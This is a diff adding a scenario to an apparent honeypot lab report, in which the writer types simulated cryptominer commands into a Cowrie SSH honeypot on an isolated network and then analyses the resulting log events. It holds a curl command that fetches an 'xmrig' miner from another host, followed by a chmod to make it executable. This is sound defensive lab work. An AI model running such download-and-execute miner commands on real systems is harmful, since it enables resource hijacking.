@@ -127,3 +127,25 @@ At last I typed `exit` and noted the time again and it was `2026-10-31T10:38:24Z
 Now if I try to map this to `MITRE ATT&CK` the number would be `T1053.003 (Scheduled Task/Job: Cron)` which is adding a cron job so the attacker can get a job to run again later (`Label: SIMULATED.`)
 
 ---
+
+## Scenario 8: miner-style commands
+
+This was the next scenario and it is about the commands of a cryptominer attacker. It is text only. I noted the start time first and it was `2026-10-31T11:03:27Z` in true UTC. The Cowrie log time for the start is `2026-10-31T16:03:27` with the same `5 hour shift` as before because of the timezone of my Debian VM. I checked first that my attacker VM Kali had only the host-only address. Then I logged in by hand from my attacker VM Kali to my own honeypot with the lab account on port `2222`.
+
+Command: `ssh <lab-account>@<vm-ip> -p 2222`
+
+I made a mistake on the first try. I typed a wrong password and then I pressed Ctrl+C. The log shows this as session `26202dcad198` with one failed login at `16:04:20` and a close at `16:04:51`. It has no successful login and no commands so it stays in the log as proof and it is not part of this scenario. Then I logged in again and this is the scenario. The web server on Kali was off the whole time because Cowrie blocks private addresses and I did not start it.
+
+I typed a curl command that tries to download a miner file called `xmrig` and then a chmod command that tries to make it executable. The file never arrived so the second command had nothing to work on.
+
+Command: `curl -O http://<kali-ip>:8000/xmrig`
+
+Command: `chmod +x xmrig`
+
+The fake shell answered the curl line with `Could not resolve host` and the chmod line with `No such file or directory`. I think this is the same Cowrie block as in scenario 5 but that is my guess because I only read the code of its `wget` and not of `curl`.
+
+I did not type `exit` this time. I waited and the fake shell printed `timed out waiting for input: auto-logout` and closed the connection by itself. So I have no end time that I noted on Kali. I think the idle timeout is about `180 seconds` but that is my guess and I did not check it in the settings.
+
+Then I came to Cowrie and the session ID was `38b83be6391c`. It shows one successful login at `16:05:02` about `7 seconds` after the connect at `16:04:55` and `no failed logins`. It shows `2 commands` that I typed which are the `curl` at `16:05:09` and the `chmod` at `16:05:37`. The whole session has `12 events`. There is no `cowrie.session.file_download` event and no `cowrie.command.failed` event. The session closed at `16:08:36` in Cowrie log time and Cowrie says `221442` milliseconds so it lasted about `3 minutes and 41 seconds`. The close time in true UTC is calculated as `2026-10-31T11:08:36Z` and it is not noted.
+
+Now if I try to map this to `MITRE ATT&CK` the number would be `T1496 (Resource Hijacking)` for the miner name `xmrig` in my commands. No miner ran and nothing was downloaded so it is only the text of the commands (`Label: SIMULATED.`)
